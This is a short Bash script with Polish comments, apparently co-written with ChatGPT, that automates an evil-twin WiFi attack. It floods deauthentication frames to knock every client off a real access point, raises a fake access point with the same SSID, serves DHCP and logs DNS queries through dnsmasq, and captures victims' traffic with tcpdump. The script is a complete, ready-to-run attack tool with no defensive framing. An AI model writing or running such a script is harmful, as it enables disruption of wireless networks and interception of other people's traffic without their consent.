#!/bin/bash
# _evil_twin_launcher.sh — Atak bliźniaczy WiFi z opcjonalnym sniffingiem
# ArO + ChatGPT OG Style

### 🧾 Parametry — zmień pod swoje:
SSID="ZlosliweWiFi123"
CHANNEL=6
IFACE_MON="wlan0mon"       # interfejs w trybie monitor
FAKE_IFACE="at0"           # interfejs wirtualny airbase
GATEWAY="10.0.0.1"
SUBNET="10.0.0.0"
DHCP_RANGE="10.0.0.10,10.0.0.50,12h"
LOGDIR="/tmp/evil_logs"

### 🟢 Setup:
sudo mkdir -p "$LOGDIR"
echo -e "\n[*] Rozpoczynam atak Evil Twin..."
sleep 1

### 🔥 Deauth – wyrzucenie klientów z prawdziwego AP
echo -e "\n[+] Deauth all users from AP..."
xterm -hold -e "sudo aireplay-ng --deauth 0 -e \"$SSID\" -c FF:FF:FF:FF:FF:FF $IFACE_MON" &

sleep 3

### 📡 Fake AP
echo -e "[+] Tworzę fałszywe AP o nazwie: $SSID na kanale $CHANNEL..."
xterm -hold -e "sudo airbase-ng -e \"$SSID\" -c $CHANNEL $IFACE_MON" &

sleep 4

### 🌐 DHCP + fake routing
echo -e "[+] Konfiguracja DHCP na $FAKE_IFACE ($GATEWAY)..."
sudo ifconfig $FAKE_IFACE up $GATEWAY netmask 255.255.255.0
sudo route add -net $SUBNET netmask 255.255.255.0 gw $GATEWAY

### 🧰 dnsmasq
echo -e "[+] Uruchamiam dnsmasq..."
sudo killall dnsmasq 2>/dev/null
sudo dnsmasq -i $FAKE_IFACE --dhcp-range=$DHCP_RANGE \
 --log-dhcp --log-queries \
 --dhcp-option=3,$GATEWAY \
 --dhcp-option=6,8.8.8.8 \
 --log-facility=$LOGDIR/dnsmasq.log

### 🧪 Monitorowanie ruchu
echo -e "[+] Opcjonalne sniffing... (ctrl+c aby zakończyć sniff)"
sudo xterm -hold -e "tcpdump -i $FAKE_IFACE -w $LOGDIR/sniff.pcap"

echo -e "\n[✓] Fake AP działa. Logi DHCP + sniff w $LOGDIR"
#
#
# OPIS:
#  Zautomatyzowany atak bliźniaczy:
#  rozłącza wszystkich,
#  stawia fałszywy AP z takim samym SSID,
#  loguje próby połączenia,
#  ustawia DHCP (dnsmasq),
#  opcjonalnie: możesz podłączyć bettercap lub Wireshark.

